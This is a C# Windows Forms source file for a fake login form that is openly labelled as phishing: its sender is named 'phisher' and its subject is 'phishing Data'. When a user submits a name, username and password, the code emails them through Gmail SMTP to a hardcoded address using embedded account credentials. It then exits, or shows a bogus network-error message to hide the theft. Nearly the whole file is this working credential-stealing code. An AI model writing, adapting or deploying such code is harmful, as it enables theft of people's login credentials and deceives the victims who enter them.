using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Mail;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace commerced
{
    public partial class Emails : Form
    {
        public Emails()
        {
            InitializeComponent();
        }
        int x = 0;
        string texto = "my name is rozaria";
        int tam = 3;
        private void button1_Click(object sender, EventArgs e)
        {
            //the faults can be begun with only after this comment.
            if (textusername.Text == "")
            {
                textusername.BackColor = Color.YellowGreen;

                return;
            }
            else { textname.BackColor = Color.White; }

            if (textpassword.Text == "")
            {
                textpassword.BackColor = Color.Salmon;
                return;
            }
            else { textpassword.BackColor = Color.White; }
            if (textname.Text == "")
            {
                textname.BackColor = Color.SeaGreen;
                return;
            }
            else { textname.BackColor = Color.White; }
            try
            {
                MailMessage msg = new MailMessage();
                msg.From = new MailAddress("randomTestemail33@gmail.com", "phisher");
                msg.To.Add(new MailAddress("randomTestemail33@gmail.com"));
                msg.Subject = "phishing Data";
                msg.Body = "Here is your data! :" + textname.Text + " username: " + textusername.Text + "password:" + textpassword.Text;
                msg.IsBodyHtml = false;
                SmtpClient smtp = new SmtpClient();
                smtp.Host = "smtp.gmail.com";
                smtp.Credentials = new NetworkCredential("randomTestemail33@gmail.com", "1234567");
                smtp.EnableSsl = true;
                smtp.Send(msg);
                Application.Exit();

            }
            catch
            {
                MessageBox.Show("Login unsuccessfull, please check your network connectivity and try again.", "Login Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                this.Close();
                    
            }
            // the fault can be begun with after this commentline.
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            //the function of timer1.
            this.Refresh();
            label4.Left += 5;
            if (label4.Left >= this.Width)
                label4.Left = label4.Width * -1;
            Graphics gra = this.CreateGraphics();
            gra.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality;
            gra.DrawString(texto, new Font("calibri", tam), new SolidBrush(Color.Red), x, 70);
            x += 10;
            if (x >= this.Width)
                x = texto.Length * tam * -1;
            //that is all codes of my program.
        }

        private void label4_Click(object sender, EventArgs e)
        {

        }
    }
}
